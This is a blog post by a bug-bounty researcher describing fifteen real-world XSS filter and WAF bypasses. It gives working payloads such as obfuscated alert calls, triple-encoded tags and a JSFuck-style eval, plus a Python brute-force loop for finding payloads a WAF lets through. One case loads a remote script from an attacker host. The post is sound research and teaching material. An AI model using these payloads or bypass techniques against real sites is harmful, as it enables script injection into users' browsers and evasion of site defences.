---
title: "15 examples of XSS filters bypass"
tags: [vulnérabilité]
---

Introduction
------------

So, I finally reached [first place on OpenBugBounty](https://www.openbugbounty.org/researchers/top/). It had been a long time since I started scanning for XSS vulnerabilities.  

In the end of 2019 it was [in the process of discovering false-positives]({% link _posts/2020-02-03-One-crazy-month-of-web-vulnerability-scanning.md %}) in the XSS module on my open-source web vulnerability scanner [Wapiti](https://wapiti.sourceforge.io/).  

On november 2020 I continued scanning but with a modified version of the XSS module to collect possible cases of false-negatives. What does it mean ? It means that while some characters were reflected in the webpage at the time of injection, Wapiti wasn't able to find a working payload. Either it is due to a bug or a XSS filter blocking the payload.  

So I collected more than 1000 XSS reports and I started the painful process of analysing each, trying to understand what happened and see if I can bypass the filter / WAF if this is interesting enough and get a working payload.  

I still have more than 750 reports to check, but I already made a small list of interesting bypass bellow, I hope you will enjoy it.  

If I find more interesting bypass I will certainly publish more articles :)  

The longer, the better
----------------------

One of the payloads used by Wapiti was generated using [JSFuck](https://en.wikipedia.org/wiki/JSFuck). It is in fact the obfuscated equivalent of a `alert(1)` payload using only the following 6 characters:  

```
[]()!+
```

This payload is at the bottom of the payloads list of Wapiti because even if it passes the filters you can't necessarily go beyond the proof of concept due to the payload being very long.  

Nevertheless, it is always funny to see it pop as the only payload that worked as it is often related to curious cases.  

Here was a japanese website with a single point of injection:  

```html
<body>
      <form name="form1" method="post" action="./elegant.aspx?m=117007&amp;page=INJECTION"id="form1">
<div>
```

Unfortunately the HTML characters seems correctly converted to their entities equivalent:

```html
<form name="form1" method="post" action="./elegant.aspx?m=117007&amp;page=%22%3e%3cscript%3ealert(%2fxss%2f)%3c%2fscript%3e" id="form1">
```

Now let's put 2048 `A` characters before our script tag. This time there is a new point of injection at the top of the webpage:  

```html
异常页面： http://victim/page.aspx?m=117007&page=">AAAAAAA---snip---AAAAAAA<script>alert(/xss/)</script>
异常信息： 此请求的查询字符串的长度超过配置的 maxQueryStringLength 值。
信息详情： <pre style='line-height:18px;'>System.Web.HttpException (0x80004005): 此请求的查询字符串的长度超过配置的 maxQueryStringLength 值。
   在 System.Web.HttpRequest.ValidateInputIfRequiredByConfig()
   在 System.Web.HttpApplication.ValidateRequestExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
   在 System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously)
```

Victory! By putting a large number of characters we triggered an exception that doesn't properly sanitize a debug message.  

Bypass using a new function
---------------------------

Here we have an injection on a Korean website. At first look it is promising as we are able to escape the attribute value and inject some special characters:  

```html
<a class="link_corp btn1" href="/board/?id="></a>zaza"zaza'zaza>"><span>목록</span></a>
```

Unfortunately if we try to put a `script` tag we are rejected:  

```
The requested URL was rejected. Please consult with your administrator.

The requested URL was: http://victim/view?id=%22%3E%3C%2Fa%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E&no=3070%2F

Your IP-address: ---snip---
Your support ID is: ---snip---
```

Let's try a different payload: 
```html
<svg/onload%3dalert(/xss/)>
```
... rejected too.  

But if we replace `alert` for a non-existing function (like `zaza`) the code gets reflected. We may want to use the `window` object and pass it an obfuscated `alert` value, but it seems `window` is blacklisted too as the following payload is rejected:  

```html
<svg onload=window['zaza'])>
```

Really ? No, in fact the website seems to have some kind of regex like 
```
window\[.*\]
```

so what about returning `window` from a function and then use `[]` on the returned value ? It can be done with an anonymous function :) Of course we still have to split the `alert` word. Here is the final payload:  

```html
<body onload='var x="al";(function(){return window})()[x+"ert"]("XSS")'>
```

Bypass using triple encoding
----------------------------

On a chinese website if I inject `"/>INJECT1><INJECT2` I got half of the reflection:  

```html
<link rel="alternate" media="only screen" href="https://victim/index.php?pageID="/>INJECT1>">
```

A few more tests by appending a closing `<` character or another tag shows that the script is certainly using `strip_tags()`.
If I double encode the `<` character in the URL (meaning I pass the value `"/>INJECT1>%253cINJECT2>`) it doesn't get any better but _surprise motherfucker!_ It seems to evade filters if I triple encode it:  

```html
<link rel="alternate" media="only screen" href="https://victim/index.php?pageID="/>INJECT1><INJECT2>">
```

Now I should be done by passing 
```
"/>%25253cscript>alert(%27XSS%27)%25253c/script>
```

But it turns out that our closing tag is removed and some JS code is appended for whatever reason:  

```html
<script>alert('XSS')var config={"webRoot":"\/","cookieLife":30,---snip---
```

Putting a semicolon or HTML comment should fix the situation, but we bump into another problem this time:  

```html
<script>alert('XSS');">
        <title>---snip---</title>
```

All the code in the script tag must be valid otherwise our `alert` won't be executed. As the presence of a closing tag previously prevented the page from putting a newline let's put it back!  

```html
<script>alert('XSS')//var config={"webRoot":
```

Victory! The final payload was 

```
"/>%25253cscript>alert(%27XSS%27)//%25253c/script>
```

Bypass inside script tag
------------------------

Having your input reflected inside a script tag is not uncommon. Here it happened on a chinese website. Characters were correctly reflected as long as you aren't using any classic payload.  

```html
<script type="application/javascript">                                                                                 
function search_p(){                                                                                                   
    var company     = $("#company").val();                                                                             
    var address     = $("#address").val();                                                                             
    //alert(address);return;                                                                                           
    if($.trim(company) != '' && $.trim(address) != ''){                                                                
        window.location.href ="/index.php?m=default.recruit&cid="+</script><injected>injected</injected>+"&sid="++"&tid="++"&company="+company+"&address="+address;
    }else if($.trim(company) != '' && $.trim(address) == ''){                                                          
        window.location.href ="/index.php?m=default.recruit&cid="+</script><injected>injected</injected>+"&sid="++"&tid="++"&company="+company;
    }else if($.trim(company) == '' && $.trim(address) != ''){                                                          
        window.location.href ="/index.php?m=default.recruit&cid="+</script><injected>injected</injected>+"&sid="++"&tid="++"&address="+address;
    }else{                                                                                                             
        window.location.reload();                                                                                      
    }                                                                                                                  
}                                                                                                          
}                                                                                                                      
</script>
```

But as soon as you try to put an opening `script` tag the website replies with an `iframe` with URL `http://safe.webscan.360.cn/stopattack.html`  

We are already inside a `script` tag and the filters allows us to close the tag (as seen above) so we just need to inject our code without breaking the existing one. Sometimes it is hard to achieve but here it is possible.  

Injection takes place just after a plus sign used for string concatenation. We can either start with a string or an int as javascript will convert types. Then we must close the `if` block then the `search_p` function before putting our code.  

The call to `alert()` was caught as well, so I used the window object to access it. The final payload is the following:  

```javascript
0;}};window['al\u0065rt']('XSS');
```

Bypass as part of a URL
------------------------

This case was really strange. The webpage takes a parameter called `protocol`. If you give injected as value you get a response like this one:  

```html
--- snip ---
<base href="injected://victim:443/">
<link rel="stylesheet" type="text/css" href="injected://victim:443/css/lq/chromestyle.css" />
<script type="text/javascript" src="injected://victim:443/css/js/jquery.js"></script>
--- snip ---
```

Trying to close any of those tag to inject a new `script` will be rejected. As we have control over the beginning of the `src` attribute of a `script` tag we can simply use the payload `//attacker/payload.js?` The rest will be part of the query string :)

Bypass with unclosed tag
------------------------

This is I guess a typical case of bypass. Injection occurs in the `action` attribute of a form. We can close the attribute with double quote and even close the form tag but then we can't inject everything that we want.  

`<script` is blocked as well as everything that seems to match a regular expression like `<\w+ on.\*=.\*>` (for example `<inject on=>` is blocked).  

Fortunately we don't necessarily need to close our tag. Here, because we are in the `action` attribute, the `>` characters appears next.  

My final payload was:  

```html
"></form><img src=x onerror="prompt`XSS`
```

which renders in the webpage to  

```html
<form action="/index/login?burl="></form><img src=x onerror="prompt`XSS`" method="post"  onsubmit="return checkNull()" id="loginform" name="loginform">
```

Confuse regexes
---------------

Injection occurs inside a link, this is very common:  

```html
<a href="index.php?p=news_list&lanmu=<injected>">
```

Characters are reflected but script tags and common payloads like `<svg onload=whatever>` are filtered... The previous trick doesn't apply here.  

Is the website using a regular expression to check for tags with a `on*` events ? It turns out we can confuse the filter with the following payload that is successfully reflected:  

```html
<svg x='>' onload=injected>
```

I had to use some basic tricks to get a final working payload:  

```html
<svg x='>' onload="window['al\u0065rt']('XSS')">
```

Bypass exploiting two parameters
--------------------------------

Here is one I'm very proud of. The reflection appeared inside a SQL error and the message looked like the following:  

```
Unknown column 'shword' in 'where clause'

select count(idx) as 'total_count' from [censored] where state = 1 AND news_free = 1 and shword = 'injection'
```

So we have control over the *injection* part but also on the `shword` value (it will be useful later). The URL looked like this :  

```
http://[censored].co.kr/lists?kind=shword.=&page=0&pcv=0%2F&menu_code&key=injection
```

Strange filters were applied on the `key` parameter. For example:  

* `<script>` is replaced by `[removed]`
* `<scrip` is not escaped but as soon as you add a trailing `t` the text is properly escaped
* some characters like the null byte aren't reflected so injection `hel%00lo` gives `hello` mais unfortunately it doesn't work for the script tag
* `onload` is reflected but not if there is an equal sign later...

So I was almost ready to give up when I thought I could reuse the equal sign from the SQL error, the one between `shword` and `injection` in the precedent output.  

I managed to get a working exploit with the following query string:  

```
kind=<svg%20onload&period=&page=0&pcv=0%2F&menu_code&key=alert`XSS`
```

producing the following error message:  

```html
You have an error in your SQL syntax(...) near '<svg onload = 'alert`XSS`'' at line 1
```

Bypass weak removal
-------------------

Here injection occurs inside a javascript tag:  

```javascript
var search = "injection";
```

Let's inject javascript without escaping the tag with the payload `-alert("xss")-` :  

```javascript
var search = ""-("xss")-"";
```

The word `alert` was removed. It can be easily bypassed with `-alalertert("xss")-`  

Bypass using a MP3
------------------

Sometimes simple tricks won't be enough. This is the case of another website that gave `Alert!!!` messages when I tried to inject common payloads.  

Strings such as `<script` or `<svg` are blocked. `<img` is not but as soon as you add `onerror` or `onload` events the alert appears.  

Playing with separators I discovered that using a newline character (something like `<img%0aonload%3d`) is successfully reflected!  

I tried to add a `src` attribute pointing to a valid image file on the website but guess what? Now my payload was blocked. I replaced the `img` tag for an `audio` one and the `onload` attribute was replaced with `oncanplay`. This time it looked like the `src` attribute wasn't checked. I found a random mp3 file on the Internet to fill it. Let's move to the JS code now.  

It was not a surprise to see that once again most JS keywords were detected. I picked a trick on [JSFuck](http://www.jsfuck.com/) to replace a call to `eval()`:  

```javascript
[]["filter"]["constructor"]( your js code here )()
```

This way all I need to do is sufficiently obfuscate the string between parenthesis :)  

`alert(` was filtered and even `()`. In fact as soon as there was some parenthesis between double quotes it seemed like I would get an alert message.  

The solution was to use string concatenation along with hexadecimal encoding :  

```javascript
"alert"+"\x28\x27XSS\x27)"
```

And the final payload passed in the vulnerable parameter :   

```html
<audio%0asrc%3d//domain.tld/sounds/bell.mp3%0aoncanplay%0a%3d%27[]["filter"]["constructor"]("alert"%2b"\x28\x27XSS\x27)")()%27x%3d%27
```

Bypass using no parenthesis
---------------------------

This time the injection was reflected inside a `script` tag. This is often the best case as there are so many ways to obfuscate javascript.  

Unfortunately the website gave some 400 error as soon as I used parenthesis or square brackets.  

A known way to generate an alert without those characters is to overwrite onerror and throw an exception like this :  

```javascript
window.onerror = alert; throw 'XSS';
```

Bypass WAF by mixing several techniques
---------------------------------------

You know you are in front of a WAF and not simple filters when even less known techniques are blocked or trying to break simple logic (like regexes) doesn't work.  

Unfortunately there is no regular ways to bypass a WAF and if you find something today it won't necessarily work tomorrow.   

Here I found that some characters were reflected in the webpage but as soon as it looked like a XSS payload the server replied with `HTTP/2 403`. I can't tell the name of the WAF because those are often not given in the HTTP responses.  

What is great though is that most of the time WAF won't block your IP at the first bad request, meaning that you can try as long as you want until a payload work.  

The first step I took was to write a simple brute force tool using Python to try every possible XSS payload if found on [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet). I just replace the `alert(1)` in each payload to something less detectable.  

Note that you can of course use your favorite tool for this (Burp, ZAP, WFUZZ, Patator, etc)

```python
for payload in payloads:
    payload = payload.strip()
    if not payload:
        continue

    payload = payload.replace("alert(1)", "yolo")
    url = "https://target/?id=%22%3E{}".format(quote(payload))
    try:
        resp = sess.get(url, timeout=10, allow_redirects=False)
    except RequestException as exception:
        print(exception)
        continue
    else:
        if "403 Error" not in resp.text:
            print("Passed:", payload)
```

Several payloads passed successfully, but I kept the following one as it requires no user interaction :  

```html
<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss>
```

The next step as to replace the `alert()` call to something that won't be blocked and of course it was the hard part.  

Simple encodings of alert as hexadecimal (`\xXX`) or unicode (`\u00XX`) were flagged. Having a quote or double quote after a square bracket was detected too, and it looked like I could not use the plus sign too much to concatenate strings.  

Fortunately the JSFuck trick used earlier worked, but I still had to find a way to call alert. I was lucky enough because `window` was an allowed keyword, so I could use `window[f]`, I just needed to assign `alert` to a variable called `f`.  

The evaluated code was the following:  

```javascript
var f='al';f+='ert';window[f](/XSS/)
```

and the payload passed to the vulnerable parameter (a bit long):  

```
%22%3E%3C%2Fa%3E%3Cstyle%3E@keyframes%20x{}%3C/style%3E%3Cxmp%20style=%22animation-name:x%22%20onwebkitanimationstart=%22[][%27filter%27][%27constructor%27](%27var%20f%3d\x27al\x27;f%2b%3d\x27ert\x27;window[f](/XSS/)%27)()%22%3E%3C/xmp%3E
```

Bypass using new lines
----------------------

Using new lines as separator inside a payload is a very well known trick. It can't work with an advanced WAF, isn't it ?  

Well I had this case where using the same brute force that previously the only payloads permitted seemed to be those using the `onpointerrawupdate` event. So at first the WAF seemed effective.  

I updated my script, so it replaced every space with a new line and launched it again. Guess what ? I had a LOT more of payloads working. Of course the most obvious were still blocked but the difference was surprising.  

I ended with the following working exploit with no user interaction :  

```html
<a
autofocus
onfocus='(function(){return window})()["alert"]("XSS")'
href></a>
```

Bypass using window
-------------------

I found an injection on *games.verizon.com* that was reflected inside the `src` attribute of an image tag. I had control over the end of the attribute meaning the parameter was used to change an image in the webpage while keeping the base URL.  

Closing the tag and trying to open a new one was allowed as long as you injected gibberish but as soon as it makes a meaning in HTML it was blocked so even with to attribute value a string like `<a href` was blocked.  

My idea was then to add an event attribute (`onsomething`) to the existing tag but obvious ones were flagged as well. I took a look at XSS cheat sheets and went for the `onloadend` attribute. It requires a valid src for the image tag though, so I found one on the website and use a relative path (`../marketing/verizon/cs/b_chat_off.png`, fortunately `../` was blocked too).  

Then it was time to put my JS payload in this event and of course every attempt at encoding `alert`/`confirm`/`prompt` or even using parenthesis failed. For example, stuff like the following string were blocked:  

```javascript
var x = 'al';x += 'ert';x('XSS');
```

A known trick to generate an alert without the classic functions is to overwrite `onerror` and throw an exception. But as I said earlier onerror was detected, so I ended up with the following payload:  

```javascript
>window['o'+'nerror']=window['al'+'ert'];throw
game=../marketing/verizon/cs/b_chat_off.png"onloadend="window['o'+'nerror']=window['al'+'ert'];throw 'XSS'">
```

Bypass using a JS function taking a callback
--------------------------------------------

As in a previous example I used a brute force script and saw that most of the `<style>@keyframes x{}</style>` payloads passed.  

I selected one and move to the JS part. JS objects such as `window` and `top` were blocked and string concatenation was detected too.  

It turned out `alert` wasn't blocked if not between quotes and not before an opening parenthesis.  

The trick is then to use a function that will take a callback function and apply it on all items on an array. Such functions are `find`, `map`, `reduce`, `every`, `filter`, `forEach`, `reduceRight`, `flatMap`.  

Here is the final payload:  

```html
<style>@keyframes x{}</style><details style="animation-name:x" onwebkitanimationend="['XSS'].find(alert)"></details>
```

How to bypass XSS filters
-------------------------

Here is a check-list based on my experience:  

* Enumerate all cases of reflection for the string you injected in the webpage. Some cases will be easy to leverage (inside a `script` tag), some hard (between two tags)
* Determine which characters you will necessarily use. If you can't inject an HTML tag because `<` is replaced or removed you are certainly stuck
* Start to bypass with only HTML first, work on the javascript part only once you have a reflected HTML
* Brute force for HTML tags that bypass the filter. You will save a LOT of time
* If your JS payload is blocked, replace each word with random letters. You will find if the filter is blocking them or for example parenthesis.
* If you are stuck, try to see if other parameters of the URL can help, maybe you can split your payload in parts and even reuse characters in the webpage
* Try to find a flaw in the WAF parser: does it use regexes ? You can also give unexpected values in other parameters to generate an error message that may not filter your input



*Published December 23 2020 at 18:20*
